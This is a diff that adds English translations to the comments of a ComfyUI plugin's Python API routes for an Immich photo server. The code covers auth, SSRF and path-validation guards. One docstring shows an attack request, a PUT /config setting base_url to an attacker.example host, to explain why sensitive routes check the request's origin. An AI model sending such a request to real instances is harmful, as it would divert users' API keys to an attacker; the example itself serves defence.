@@ -6,6 +6,18 @@
   插件自带最小鉴权——配置了 panel_token 后，所有 /api/immich_plus/* 请求
   必须带 `Authorization: Bearer <panel_token>`，否则 401。
   未配置 panel_token 时视为"本机信任模式"（README 建议 --listen 127.0.0.1）。
+
+Backend API routes for ComfyUI-ImmichManager.
+
+Everything is mounted under /api/immich_plus/*:
+- The frontend only knows these routes, never Immich's native API (CORS, auth
+  and configuration are all absorbed by the backend).
+- Auth: ComfyUI itself has no server-level --api-key (verified on 0.30.0, no
+  such flag), so the plugin ships minimal auth of its own — once panel_token is
+  configured, every /api/immich_plus/* request must carry
+  `Authorization: Bearer <panel_token>`, otherwise 401. With no panel_token
+  configured the plugin runs in "local trust mode" (README suggests
+  --listen 127.0.0.1).
 """
 
 import asyncio
@@ -20,7 +32,7 @@ from typing import Optional
 
 from aiohttp import web
 
-# 兼容包内导入（ComfyUI 加载）与直接脚本导入（测试）
+# 兼容包内导入（ComfyUI 加载）与直接脚本导入（测试）  # supports both package-relative import (ComfyUI) and plain script import (tests)
 try:
     from .config import (
         ALLOWED_PROXY_MODES,
@@ -35,7 +47,7 @@ try:
     )
     from .immich_client import ImmichClient, ImmichError
     from .upload_node import job_manager
-except ImportError:  # noqa: BLE001 — 直接 python3 运行（测试/调试）
+except ImportError:  # noqa: BLE001 — 直接 python3 运行（测试/调试）  # running directly through python3 (tests/debug)
     from config import (
         ALLOWED_PROXY_MODES,
         ALLOWED_TIMELINE_INTERVALS,
@@ -55,6 +67,10 @@ ROUTE_PREFIX = "/api/immich_plus"
 # 资产 id 只允许 Immich 实际使用的形态。放行 "/" 或 ".." 会让 requests 做 URL
 # 规范化，把 f"/assets/{asset_id}" 变成别的 Immich 端点，等于用操作者的 API key
 # 去打插件从未暴露的接口（见 THREAT_MODEL.md F2）。
+# Only the shapes Immich actually uses are accepted for asset ids. Allowing "/" or
+# ".." would let requests normalise the URL and turn f"/assets/{asset_id}" into a
+# different Immich endpoint, i.e. use the operator's API key against interfaces
+# this plugin never exposes (see THREAT_MODEL.md F2).
 _ASSET_ID_RE = re.compile(r"^[A-Za-z0-9_-]{1,64}$")
 
 
@@ -64,7 +80,7 @@ def _valid_asset_id(asset_id: str) -> bool:
 ALLOWED_SIZES = {"thumbnail", "preview", "original"}
 MAX_DELETE_IDS = 1000
 
-# 资产扩展名映射缓存：桶列表不带扩展名，search/metadata 全量拉一次，短 TTL 缓存
+# 资产扩展名映射缓存：桶列表不带扩展名，search/metadata 全量拉一次，短 TTL 缓存  # asset extension map cache: bucket listings carry no extension, so pull them all once via search/metadata and keep them under a short TTL
 _ext_cache: dict = {"ts": 0.0, "map": {}}
 _EXT_CACHE_TTL = 60.0
 _ext_cache_lock = threading.Lock()
@@ -75,6 +91,13 @@ async def _get_ext_map(client: ImmichClient) -> dict:
 
     - 网络拉取走 asyncio.to_thread（与 _call 纪律一致），不阻塞事件循环
     - 兜底捕 Exception（含 JSONDecodeError 等），保证 /bucket 永不因角标数据失败
+
+    English: id → extension-name map (TTL-cached; on failure returns an empty dict
+    so the main flow is unaffected).
+    - The network fetch runs through asyncio.to_thread (same discipline as _call)
+      and never blocks the event loop
+    - Catches Exception broadly (including JSONDecodeError) so /bucket never fails
+      because of badge data
     """
     getter = getattr(client, "asset_ext_map", None)
     if getter is None:
@@ -83,11 +106,16 @@ async def _get_ext_map(client: ImmichClient) -> dict:
     # ts 为 0 表示从未成功拉过。不能直接参与比较：刚启动的机器 time.monotonic()
     # 可能还小于 TTL，那样"从未拉过"会被误判成"缓存新鲜"，第一次 /bucket 就会
     # 返回空的角标映射（CI runner 上就是这么暴露的）。
+    # ts == 0 means "never fetched successfully". It must not take part in the
+    # comparison: on a freshly booted machine time.monotonic() can still be smaller
+    # than the TTL, so "never fetched" would be mistaken for "cache is fresh" and
+    # the first /bucket call would return an empty badge map (that is exactly how
+    # it surfaced on the CI runner).
     if _ext_cache["ts"] and now - _ext_cache["ts"] <= _EXT_CACHE_TTL:
         return _ext_cache["map"]
     try:
         mapping = await asyncio.to_thread(getter)
-    except Exception as exc:  # noqa: BLE001 — 角标数据失败只影响显示，不阻断时间轴
+    except Exception as exc:  # noqa: BLE001 — 角标数据失败只影响显示，不阻断时间轴  # badge-data failures only affect display and never block the timeline
         logger.warning("扩展名映射获取失败（角标可能缺失）: %r", exc)
         return _ext_cache["map"]
     with _ext_cache_lock:
@@ -97,13 +125,13 @@ async def _get_ext_map(client: ImmichClient) -> dict:
 
 logger = logging.getLogger("comfyui_immichmanager")
 
-# client 复用缓存：config 未变时复用同一 Session（连接池），变更时重建
+# client 复用缓存：config 未变时复用同一 Session（连接池），变更时重建  # client reuse cache: reuse the same Session (connection pool) while config is unchanged, rebuild it when config changes
 _client_cache: dict = {"sig": None, "client": None}
 _client_lock = threading.Lock()
 
 
 def _config_signature(config: ConfigManager) -> tuple:
-    """客户端缓存的配置指纹：base_url + api_key + 代理配置变则重建 Session。"""
+    """客户端缓存的配置指纹：base_url + api_key + 代理配置变则重建 Session。English: fingerprint of the config behind the client cache — rebuild the Session whenever base_url, api_key or the proxy config changes."""
     return (
         config.get("base_url", ""),
         config.get("api_key", ""),
@@ -117,6 +145,13 @@ def _get_client(config: ConfigManager) -> ImmichClient:
 
     面板保存配置后 base_url/api_key/代理配置变化，这里按指纹检测并重建，
     旧 Session 主动 close 释放连接池——保证配置变更即时生效、不泄漏连接。
+
+    English: get (rebuilding if needed) the Immich client.
+
+    After the panel saves config, base_url/api_key/proxy settings may change; the
+    fingerprint is checked here and the client is rebuilt, closing the old Session
+    to release its connection pool — so changes take effect immediately and no
+    connections leak.
     """
     sig = _config_signature(config)
     with _client_lock:
@@ -124,7 +159,7 @@ def _get_client(config: ConfigManager) -> ImmichClient:
             old = _client_cache["client"]
             _client_cache["client"] = ImmichClient(
                 base_url=config.get("base_url", ""),
-                # 只有当 key 是为当前 base_url 填的才用它（配置被手改时也拦住）
+                # 只有当 key 是为当前 base_url 填的才用它（配置被手改时也拦住）  # only use the key if it was entered for the current base_url (also catches hand-edited config)
                 api_key=config.api_key_for_current_host(),
                 proxy_mode=config.get("proxy_mode", "off"),
                 proxy_url=config.get("proxy_url", ""),
@@ -139,12 +174,15 @@ def _get_client(config: ConfigManager) -> ImmichClient:
 
 
 async def _call(fn, *args, **kwargs):
-    """把同步 client 调用丢到线程池，避免阻塞 aiohttp 事件循环。"""
+    """把同步 client 调用丢到线程池，避免阻塞 aiohttp 事件循环。English: push the synchronous client call into a thread pool so the aiohttp event loop never blocks."""
     return await asyncio.to_thread(fn, *args, **kwargs)
 
 
 # 本机（127.0.0.1/::1）免令牌开关：本机永远能打开面板管理令牌，
 # 避免用户把令牌重新生成/清除后把自己锁在门外。局域网设备仍须 Bearer。
+# No-token bypass for local requests (127.0.0.1/::1): the local machine must always
+# be able to open the panel and manage the token, so regenerating or clearing the
+# token cannot lock the user out. LAN devices still need Bearer.
 _TRUST_LOCALHOST = True
 
 
@@ -152,9 +190,15 @@ def _is_localhost(remote: str | None) -> bool:
     """请求来源是否本机（127.0.0.1 / ::1 / IPv4-mapped ::ffff:127.0.0.1）。
 
     只信 TCP 层真实来源 request.remote；绝不看 X-Forwarded-For（客户端可伪造）。
+
+    English: is the request source the local machine (127.0.0.1 / ::1 /
+    IPv4-mapped ::ffff:127.0.0.1)?
+
+    Only the real TCP-layer source request.remote is trusted; X-Forwarded-For is
+    never consulted (clients can forge it).
     """
     if not remote:
-        return False  # 无来源信息不盲目放行（保守）
+        return False  # 无来源信息不盲目放行（保守）  # no source information: do not let it through blindly (conservative)
     r = remote.strip().lower()
     if r in ("127.0.0.1", "::1", "localhost"):
         return True
@@ -171,6 +215,17 @@ def _check_auth(request: web.Request, config: ConfigManager) -> bool:
     一律从 Authorization header 取 token（RFC 6750，scheme 大小写不敏感）。
     不提供 query 参数通道：?token= 会泄入访问日志，且 <img src> 场景
     由前端 fetch + blob URL 携带 header 解决（见 web/immich_panel.js）。
+
+    English: panel_token authentication. No token configured = local trust mode
+    (allow everything).
+
+    Local sources (127.0.0.1/::1) are always allowed so the local machine can
+    always reach the panel to manage the token; other LAN devices must send
+    Authorization: Bearer <panel_token>. The token is always read from the
+    Authorization header (RFC 6750, the scheme is case-insensitive). There is no
+    query-parameter channel: ?token= would leak into access logs, and the
+    <img src> case is solved by the frontend fetching with a header and using a
+    blob URL (see web/immich_panel.js).
     """
     if _TRUST_LOCALHOST and _is_localhost(request.remote):
         return True
@@ -202,6 +257,27 @@ def _sensitive_denied(request: web.Request, config: ConfigManager) -> Optional[w
     ⚠️ 这里**故意不看 _TRUST_LOCALHOST** —— 那个开关管的是「未配置令牌时
     本机是否免鉴权」，与「来源是不是本机」是两件事。若绑在一起，一旦有人
     关掉本机信任，管理员在本机上就再也改不了配置（把自己锁在门外）。
+
+    English: guard for sensitive operations: config writes, reset, token management.
+
+    ⚠️ These routes cannot rely on _check_auth alone — a default install has no
+    panel_token, so _check_auth would let **everyone** through. Any LAN device
+    could then do:
+
+        PUT /config  {"base_url": "http://attacker.example/api"}
+
+    pointing Immich at a server of its own, so the next upload would carry the
+    user's Immich API key there. Hence one of "local source" or "holds a valid
+    token" is required here.
+
+    Remote calls holding a token are allowed so the reverse-proxy setup keeps
+    working: with ComfyUI behind nginx, request.remote is the proxy's internal
+    address, not loopback.
+
+    ⚠️ _TRUST_LOCALHOST is **deliberately ignored** here — that switch controls
+    "is a token-less local request allowed", which is a different question from
+    "is the source local". Tying them together would mean that turning off local
+    trust locks the administrator out of editing config on the local machine.
     """
     if _is_localhost(request.remote):
         return None
@@ -214,12 +290,12 @@ def _sensitive_denied(request: web.Request, config: ConfigManager) -> Optional[w
 
 
 def _unauthorized() -> web.Response:
-    """401 统一响应：提示客户端需携带面板令牌。"""
+    """401 统一响应：提示客户端需携带面板令牌。English: the uniform 401 response — tells the client to send a panel token."""
     return web.json_response({"error": "未授权：需要 Authorization: Bearer <panel_token>"}, status=401)
 
 
 def _error(message: str, status: int = 400) -> web.Response:
-    """统一错误响应 JSON。"""
+    """统一错误响应 JSON。English: the uniform JSON error response."""
     return web.json_response({"error": message}, status=status)
 
 
@@ -233,10 +309,10 @@ def _parse_bool(value) -> bool:
 
 def setup_routes(server) -> None:
     routes = server.routes
-    # 与 upload_node 共用同一 config 实例（面板配置变更即时对节点生效）
+    # 与 upload_node 共用同一 config 实例（面板配置变更即时对节点生效）  # share the same config instance as upload_node (panel changes hit the nodes immediately)
     config = _get_shared_config()
 
-    # ---------- 配置 ----------
+    # ---------- 配置 / Config ----------
 
     @routes.get(f"{ROUTE_PREFIX}/config")
     async def get_config(request: web.Request) -> web.Response:
@@ -268,17 +344,23 @@ def setup_routes(server) -> None:
             if k == "api_key":
                 # 前端只拿到 api_key_configured 布尔；误回传真实 key 形状的
                 # 值（布尔/空串/True/False）一律忽略，避免覆盖
+                # The frontend only ever sees the api_key_configured boolean; any
+                # value shaped like a real key (bool/empty string/True/False) is
+                # ignored so the stored key is never overwritten
                 cleaned = ConfigManager.sanitize_api_key(v)
                 if cleaned is None:
                     continue
                 updates[k] = cleaned
             elif k == "panel_token":
                 # 空串忽略（避免误清空导致安全降级回信任模式）；
-                # 清空令牌走配置页 🔒 安全分组的「清除」按钮
+                # 清空令牌走设置对话框 🔒 安全分组的「清空」按钮
+                # Empty strings are ignored (an accidental clear would silently
+                # downgrade to trust mode); clearing the token is done with the
+                # "Clear" button of the 🔒 security group in the Settings dialog
                 if isinstance(v, str) and v.strip():
                     updates[k] = v.strip()
             elif k == "base_url":
-                # SSRF 防线：协议白名单 + host 校验（非法直接 400）
+                # SSRF 防线：协议白名单 + host 校验（非法直接 400）  # SSRF guard: scheme allow-list + host validation (invalid input returns 400)
                 try:
                     updates[k] = normalize_base_url(v)
                 except ValueError as exc:
@@ -288,7 +370,7 @@ def setup_routes(server) -> None:
                     num = max(0, int(v))
                 except (TypeError, ValueError):
                     return _error(f"{k} 必须是数字")
-                # 下界 1，避免 0/负数导致 Immich 分页异常
+                # 下界 1，避免 0/负数导致 Immich 分页异常  # lower bound 1, so 0/negative values cannot break Immich pagination
                 updates[k] = min(max(num, 1), 1000)
             elif k == "timeline_range":
                 if not isinstance(v, str) or v not in ALLOWED_TIMELINE_RANGES:
@@ -305,6 +387,9 @@ def setup_routes(server) -> None:
             elif k == "proxy_url":
                 # ""/空白 = 清除已存地址（用户在面板清空输入框并保存）；
                 # 非空则校验（任何模式下都校验：地址写错要当场报错，而不是静默吞掉）
+                # ""/whitespace = clear the stored URL (the user emptied the field
+                # in the panel and saved); non-empty is validated (in every mode: a
+                # typo must fail loudly instead of being swallowed silently)
                 if not isinstance(v, str):
                     return _error("proxy_url 必须是字符串")
                 if not v.strip():
@@ -320,6 +405,9 @@ def setup_routes(server) -> None:
             return web.json_response(config.public_config())
         # custom 模式必须带地址：按"本次改动合并后的最终态"校验，
         # 避免只切模式不填地址（或只清地址不切模式）留下脏配置
+        # custom mode requires a URL: validate against "the final state after
+        # merging this update" so that switching mode without a URL (or clearing
+        # the URL without switching mode) cannot leave a dirty config behind
         eff_mode = updates.get("proxy_mode", config.get("proxy_mode", "off"))
         eff_url = updates.get("proxy_url", config.get("proxy_url", ""))
         if eff_mode == "custom" and not eff_url:
@@ -331,6 +419,10 @@ def setup_routes(server) -> None:
         result = config.public_config()
         # 自动生成面板令牌：连接配置好后（api_key 已配置）仍无 token → 生成并一次性下发明文。
         # 已有 token 或本次请求显式带了 panel_token 时保持不动（不触发）。
+        # Auto-generate the panel token: once the connection is configured
+        # (api_key set) and there is still no token → generate one and hand the
+        # plaintext down once. If a token already exists, or this request
+        # explicitly carried panel_token, nothing happens.
         if not config.get("panel_token", "") and config.get("api_key", ""):
             token = config.generate_panel_token()
             result = config.public_config()
@@ -340,7 +432,12 @@ def setup_routes(server) -> None:
     @routes.post(f"{ROUTE_PREFIX}/config/reset")
     async def reset_config(request: web.Request) -> web.Response:
         """清空配置：恢复出厂默认（清空 Immich 地址 / API Key / 面板令牌等），
-        回到刚安装插件时的状态。仅本机、或携带有效面板令牌。"""
+        回到刚安装插件时的状态。仅本机、或携带有效面板令牌。
+
+        English: wipe the config back to factory defaults (Immich URL / API key /
+        panel token etc.), i.e. the state right after installing the plugin.
+        Local requests or a valid panel token only.
+        """
         denied = _sensitive_denied(request, config)
         if denied is not None:
             return denied
@@ -349,7 +446,7 @@ def setup_routes(server) -> None:
         config.reset()
         return web.json_response(config.public_config())
 
-    # ---------- 面板令牌 ----------
+    # ---------- 面板令牌 / Panel token ----------
 
     @routes.post(f"{ROUTE_PREFIX}/panel-token")
     async def panel_token_generate(request: web.Request) -> web.Response:
@@ -358,6 +455,15 @@ def setup_routes(server) -> None:
         无令牌时（首次）直接生成；已有令牌时要求鉴权，防止他人"换锁"
         把现有会话全部锁在外面。明文只在本次响应中出现一次（阅后即焚）。
         仅本机、或携带有效面板令牌 —— 否则远程可以抢先设置令牌把人锁在外面。
+
+        English: generate/regenerate the panel token.
+
+        With no token yet (first run) it is generated directly; once a token
+        exists, authentication is required so nobody can "change the lock" and
+        shut every existing session out. The plaintext appears only in this
+        response, once (burn after reading). Local requests or a valid panel
+        token only — otherwise a remote caller could set the token first and lock
+        the user out.
         """
         denied = _sensitive_denied(request, config)
         if denied is not None:
@@ -372,6 +478,12 @@ def setup_routes(server) -> None:
         """显示当前面板令牌明文（仅本次响应下发，前端展示后即焚）。
 
         令牌等于管理员凭据，所以同样限制为本机或已持牌者。
+
+        English: show the current panel token in plaintext (sent only in this
+        response; the frontend burns it right after displaying).
+
+        The token is effectively an administrator credential, so it is likewise
+        limited to local requests or token holders.
         """
         denied = _sensitive_denied(request, config)
         if denied is not None:
@@ -385,7 +497,7 @@ def setup_routes(server) -> None:
 
     @routes.delete(f"{ROUTE_PREFIX}/panel-token")
     async def panel_token_clear(request: web.Request) -> web.Response:
-        """清除面板令牌（回到信任模式）。仅本机或已持牌者。"""
+        """清除面板令牌（回到信任模式）。仅本机或已持牌者。English: clear the panel token (back to trust mode). Local requests or token holders only."""
         denied = _sensitive_denied(request, config)
         if denied is not None:
             return denied
@@ -394,7 +506,7 @@ def setup_routes(server) -> None:
         config.clear_panel_token()
         return web.json_response({"cleared": True})
 
-    # ---------- 健康检查 ----------
+    # ---------- 健康检查 / Health check ----------
 
     @routes.get(f"{ROUTE_PREFIX}/health")
     async def health(request: web.Request) -> web.Response:
@@ -404,11 +516,20 @@ def setup_routes(server) -> None:
         2. stage=connect version 拿不到（地址不可达 / 非 Immich / 网络错误）
         3. stage=auth    buckets 401（API key 无效）或其他请求失败
         4. ok=true       version + buckets 都通过，附带资产统计
+
+        English: test the connection: staged validation with explicit feedback.
+
+        1. stage=config  no API key configured
+        2. stage=connect cannot get version (address unreachable / not Immich /
+           network error)
+        3. stage=auth    buckets returns 401 (invalid API key) or another request
+           fails
+        4. ok=true       both version and buckets passed, with asset counts
         """
         if not _check_auth(request, config):
             return _unauthorized()
         client = _get_client(config)
-        # 自定义代理时把代理地址带回前端：connect 失败要能区分"代理挂了"和"Immich 挂了"
+        # 自定义代理时把代理地址带回前端：connect 失败要能区分"代理挂了"和"Immich 挂了"  # with a custom proxy, echo the proxy URL back to the frontend so connect failures can tell "proxy is down" from "Immich is down"
         _proxy_field = (
             {"proxy_url": config.get("proxy_url", "")}
             if config.get("proxy_mode", "off") == "custom" and config.get("proxy_url", "")
@@ -418,7 +539,7 @@ def setup_routes(server) -> None:
             return web.json_response(
                 {"ok": False, "stage": "config", "error": "未配置 Immich API key"}, status=200
             )
-        # 1. 地址可达 + 是 Immich：version（公开端点，不校验 key）
+        # 1. 地址可达 + 是 Immich：version（公开端点，不校验 key）  # 1. address reachable and really Immich: version (public endpoint, no key check)
         try:
             version = await _call(client.version)
         except ImmichError as exc:
@@ -431,7 +552,7 @@ def setup_routes(server) -> None:
                 {"ok": False, "stage": "connect", "error": f"服务响应异常 (HTTP {exc.status_code})", **_proxy_field},
                 status=200,
             )
-        # 2. API key 有效性 + 资产统计：buckets（需鉴权）
+        # 2. API key 有效性 + 资产统计：buckets（需鉴权）  # 2. API key validity + asset counts: buckets (requires auth)
         try:
             buckets = await _call(client.get_buckets, "desc")
         except ImmichError as exc:
@@ -461,7 +582,7 @@ def setup_routes(server) -> None:
             }
         )
 
-    # ---------- 时间轴 ----------
+    # ---------- 时间轴 / Timeline ----------
 
     @routes.get(f"{ROUTE_PREFIX}/buckets")
     async def buckets(request: web.Request) -> web.Response:
@@ -488,7 +609,7 @@ def setup_routes(server) -> None:
             data = await _call(client.get_bucket, time_bucket, order)
         except ImmichError as exc:
             return _error(_safe_error(exc), 502)
-        # 附加扩展名（格式角标用）：桶列式响应不带，从缓存映射补
+        # 附加扩展名（格式角标用）：桶列式响应不带，从缓存映射补  # attach the extension (used by the format badge): the bucket listing omits it, fill it in from the cached map
         ext_map = await _get_ext_map(client)
         if ext_map:
             for a in data:
@@ -496,7 +617,7 @@ def setup_routes(server) -> None:
                     a["ext"] = ext_map[a["id"]]
         return web.json_response(data)
 
-    # ---------- 资产 ----------
+    # ---------- 资产 / Assets ----------
 
     @routes.get(f"{ROUTE_PREFIX}/assets/{{asset_id}}")
     async def asset_detail(request: web.Request) -> web.Response:
@@ -523,7 +644,7 @@ def setup_routes(server) -> None:
         if size not in ALLOWED_SIZES:
             return _error(f"size 必须是 {sorted(ALLOWED_SIZES)} 之一")
         client = _get_client(config)
-        # 条件请求头必须在发请求前传给上游（事后对 PreparedRequest 赋值无效）
+        # 条件请求头必须在发请求前传给上游（事后对 PreparedRequest 赋值无效）  # conditional request headers must reach upstream before the request is sent (assigning them to a PreparedRequest afterwards has no effect)
         cond_headers = {}
         for h in ("If-None-Match", "If-Modified-Since"):
             if request.headers.get(h):
@@ -532,12 +653,12 @@ def setup_routes(server) -> None:
             upstream = await _call(client.get_thumbnail, asset_id, size, cond_headers or None)
         except ImmichError as exc:
             return _error(_safe_error(exc), exc.status_code or 502)
-        # 透传缓存头，让浏览器缓存真正生效
+        # 透传缓存头，让浏览器缓存真正生效  # pass cache headers through so browser caching actually works
         headers = {}
         for h in ("Content-Type", "ETag", "Last-Modified", "Cache-Control"):
             if h in upstream.headers:
                 headers[h] = upstream.headers[h]
-        # 上游判定未修改 → 直接回 304（浏览器命中缓存）
+        # 上游判定未修改 → 直接回 304（浏览器命中缓存）  # upstream says not modified → reply 304 directly (browser cache hit)
         if upstream.status_code == 304:
             upstream.close()
             return web.Response(status=304, headers=headers)
@@ -546,7 +667,7 @@ def setup_routes(server) -> None:
         try:
             async for chunk in _iter_upstream(upstream):
                 await response.write(chunk)
-        except Exception as exc:  # noqa: BLE001 — 流式中断不应让整个请求 500
+        except Exception as exc:  # noqa: BLE001 — 流式中断不应让整个请求 500  # a streaming interruption must not turn the whole request into a 500
             logger.warning("缩略图流式转发中断: %s", exc)
         finally:
             upstream.close()
@@ -554,7 +675,7 @@ def setup_routes(server) -> None:
         return response
 
     def _png_text_chunks(data: bytes) -> dict:
-        """从 PNG 里取 tEXt / iTXt 文本块（ComfyUI 把 prompt / workflow 写在这）。"""
+        """从 PNG 里取 tEXt / iTXt 文本块（ComfyUI 把 prompt / workflow 写在这）。English: pull the tEXt / iTXt text chunks out of a PNG (that is where ComfyUI writes prompt / workflow)."""
         out: dict = {}
         if not data.startswith(b"\x89PNG\r\n\x1a\n"):
             return out
@@ -584,10 +705,10 @@ def setup_routes(server) -> None:
         return out
 
     def _video_text_metadata(path: str) -> dict:
-        """从视频容器里取 metadata（ComfyUI 用 ffmpeg tag 存 prompt / workflow）。"""
+        """从视频容器里取 metadata（ComfyUI 用 ffmpeg tag 存 prompt / workflow）。English: read metadata from the video container (ComfyUI stores prompt / workflow in ffmpeg tags)."""
         out: dict = {}
         try:
-            import av  # noqa: PLC0415 — ComfyUI 自带 PyAV
+            import av  # noqa: PLC0415 — ComfyUI 自带 PyAV  # ComfyUI ships PyAV
         except Exception:
             return out
         try:
@@ -600,7 +721,7 @@ def setup_routes(server) -> None:
 
     @routes.get(f"{ROUTE_PREFIX}/assets/{{asset_id}}/workflow")
     async def asset_workflow(request: web.Request) -> web.Response:
-        """返回该资产里嵌入的 ComfyUI 工作流（图片读 PNG 文本块，视频读容器 metadata）。"""
+        """返回该资产里嵌入的 ComfyUI 工作流（图片读 PNG 文本块，视频读容器 metadata）。English: return the ComfyUI workflow embedded in this asset (images: PNG text chunks, videos: container metadata)."""
         if not _check_auth(request, config):
             return _unauthorized()
         asset_id = request.match_info["asset_id"]
@@ -630,7 +751,7 @@ def setup_routes(server) -> None:
                         pass
             wf = meta.get("workflow")
             pm = meta.get("prompt")
-            # 有些容器把 JSON 存在 comment/description 里
+            # 有些容器把 JSON 存在 comment/description 里  # some containers keep the JSON in comment/description
             if not wf:
                 for key in ("comment", "description", "com.apple.quicktime.description"):
                     v = meta.get(key)
@@ -654,6 +775,15 @@ def setup_routes(server) -> None:
         - fetch + blob 播放：前端先 GET（带鉴权 header）整读再播放，故无需 Range 支持
         - 透传 Content-Type / Content-Length / ETag / Last-Modified / Cache-Control
         - 客户端 _request 禁重定向：直接调 /original 端点，不走 fullsize 302
+
+        English: proxy for the asset's original file (large images / video playback).
+
+        - fetch + blob playback: the frontend first GETs the whole file (with the
+          auth header) and then plays it, so Range support is not needed
+        - Passes through Content-Type / Content-Length / ETag / Last-Modified /
+          Cache-Control
+        - The client's _request forbids redirects: call the /original endpoint
+          directly instead of following the fullsize 302
         """
         if not _check_auth(request, config):
             return _unauthorized()
@@ -675,7 +805,7 @@ def setup_routes(server) -> None:
         try:
             async for chunk in _iter_upstream(upstream):
                 await response.write(chunk)
-        except Exception as exc:  # noqa: BLE001 — 流式中断不应让整个请求 500
+        except Exception as exc:  # noqa: BLE001 — 流式中断不应让整个请求 500  # a streaming interruption must not turn the whole request into a 500
             logger.warning("原文件流式转发中断: %s", exc)
         finally:
             upstream.close()
@@ -688,6 +818,13 @@ def setup_routes(server) -> None:
 
         内部优先 Immich 批量端点 PUT /assets，失败降级逐条（见
         ImmichClient.update_assets_bulk），返回部分成功语义。
+
+        English: bulk favourite/unfavourite: PUT /assets + body {ids, isFavorite}
+        (set semantics, idempotent).
+
+        Internally prefers Immich's bulk endpoint PUT /assets and falls back to
+        one-by-one calls when it fails (see ImmichClient.update_assets_bulk); the
+        result reports partial success.
         """
         denied = _sensitive_denied(request, config)
         if denied is not None:
@@ -711,7 +848,7 @@ def setup_routes(server) -> None:
             result = await _call(client.update_assets_bulk, ids, payload["isFavorite"])
         except ImmichError as exc:
             return _error(_safe_error(exc), exc.status_code or 502)
-        # 部分成功：返回 200 + failed 明细；全部失败 → 502
+        # 部分成功：返回 200 + failed 明细；全部失败 → 502  # partial success: 200 + failed detail; all failed → 502
         if result.get("updated", 0) == 0 and result.get("failed"):
             return _error("资产更新失败", 502)
         return web.json_response(result)
@@ -739,7 +876,7 @@ def setup_routes(server) -> None:
 
     @routes.delete(f"{ROUTE_PREFIX}/assets")
     async def assets_delete(request: web.Request) -> web.Response:
-        """批量删除：DELETE /assets + body {ids}。删除总进回收站（v2 实测）。"""
+        """批量删除：DELETE /assets + body {ids}。删除总进回收站（v2 实测）。English: bulk delete: DELETE /assets + body {ids}. Deletes always land in the trash (verified on v2)."""
         denied = _sensitive_denied(request, config)
         if denied is not None:
             return denied
@@ -763,7 +900,7 @@ def setup_routes(server) -> None:
             return _error(_safe_error(exc), exc.status_code or 502)
         return web.json_response({"deleted": ok})
 
-    # ---------- 异步上传任务 ----------
+    # ---------- 异步上传任务 / Async upload jobs ----------
 
     @routes.get(f"{ROUTE_PREFIX}/jobs/{{job_id}}")
     async def job_status(request: web.Request) -> web.Response:
@@ -774,9 +911,9 @@ def setup_routes(server) -> None:
             return _error("任务不存在", 404)
         return web.json_response(job)
 
-    # ---------- 相册 ----------
+    # ---------- 相册 / Albums ----------
 
-    # 主面板 UI 状态（跟着服务器走，不进工作流）
+    # 主面板 UI 状态（跟着服务器走，不进工作流）  # main panel UI state (server-side, never part of the workflow)
     def _ui_state_path() -> str:
         return os.path.join(os.path.dirname(os.path.abspath(config.config_path)), "panel_state.json")
 
@@ -840,6 +977,12 @@ def setup_routes(server) -> None:
         """按条件搜索：album / person / tag / after / before / type / order。
 
         多个同名参数可重复（?album=a&album=b），前端按条件拼接。
+
+        English: search by criteria: album / person / tag / after / before / type /
+        order.
+
+        The same parameter may be repeated (?album=a&album=b); the frontend
+        combines the criteria.
         """
         if not _check_auth(request, config):
             return _unauthorized()
@@ -870,7 +1013,7 @@ def setup_routes(server) -> None:
         if not _check_auth(request, config):
             return _unauthorized()
         album_id = request.match_info["album_id"]
-        if not _valid_asset_id(album_id):        # 同一套 UUID 白名单
+        if not _valid_asset_id(album_id):        # 同一套 UUID 白名单  # same UUID allow-list
             return _error("相册 id 格式不正确", 400)
         try:
             page = int(request.query.get("page", "1"))
@@ -899,19 +1042,19 @@ def setup_routes(server) -> None:
 
 
 def _safe_error(exc: ImmichError) -> str:
-    """错误信息脱敏：不回传 Immich 内部细节/路径，只回状态码。"""
+    """错误信息脱敏：不回传 Immich 内部细节/路径，只回状态码。English: sanitise error messages: never return Immich internals/paths, only the status code."""
     if exc.status_code:
         return f"Immich 请求失败 (HTTP {exc.status_code})"
     return "Immich 连接失败"
 
 
 async def _iter_upstream(upstream):
-    """分块读取上游响应（在 executor 里跑，避免阻塞事件循环）。"""
+    """分块读取上游响应（在 executor 里跑，避免阻塞事件循环）。English: read the upstream response in chunks (runs in an executor so the event loop never blocks)."""
     loop = asyncio.get_running_loop()
     while True:
         try:
             chunk = await loop.run_in_executor(None, upstream.raw.read, 64 * 1024)
-        except Exception:  # noqa: BLE001 — 上游断流按流结束处理
+        except Exception:  # noqa: BLE001 — 上游断流按流结束处理  # an upstream disconnect is treated as end of stream
             break
         if not chunk:
             break
